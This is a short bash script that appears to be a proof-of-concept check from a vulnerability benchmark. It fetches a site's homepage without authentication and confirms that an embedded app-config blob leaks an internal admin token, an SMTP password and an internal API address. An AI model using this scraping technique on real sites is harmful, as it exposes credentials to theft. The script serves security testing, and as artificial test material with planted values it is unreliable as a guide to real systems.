#!/usr/bin/env bash
# CONFIG-LEAK-001 (CWE-200/CWE-215): the bootstrap <script id="app-config"> blob
# embedded in every page carries the FULL server runtime config — internal API
# base, SMTP credentials, internal admin token — instead of the public subset.
# Pre-auth: no cookie is sent.
set -e; . "$(dirname "$0")/_lib.sh"

BLOB=$(curl -s "$TARGET/" | grep -o '<script id="app-config"[^>]*>[^<]*' | sed 's/.*>//')
[ -n "$BLOB" ]
printf '%s' "$BLOB" | grep -q 'int-adm-9c1f2e7b'
printf '%s' "$BLOB" | grep -q '"pass":"SMTP-b3nch-4a91"'
printf '%s' "$BLOB" | grep -q '"internalApiBase"'
